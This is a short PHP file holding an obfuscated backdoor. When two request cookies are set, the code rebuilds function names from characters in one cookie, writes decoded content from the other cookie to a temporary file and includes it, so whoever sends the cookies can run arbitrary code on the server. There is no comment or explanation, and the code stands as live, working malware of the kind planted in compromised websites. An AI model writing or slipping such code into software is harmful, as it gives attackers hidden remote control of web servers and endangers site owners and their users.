<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[18])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 3;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[18][$n];
        if (!$c[18][$n + 1]) {
            if (!$c[18][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 3 + 1;
    }
    $k = $p[21]() . $p[13];
    if (!$p[0]($k)) {
        $n = $p[26]($k, $p[5]);
        $p[11]($n, $p[9] . $p[27]($p[17]($c[3])));
    }
    include($k);
}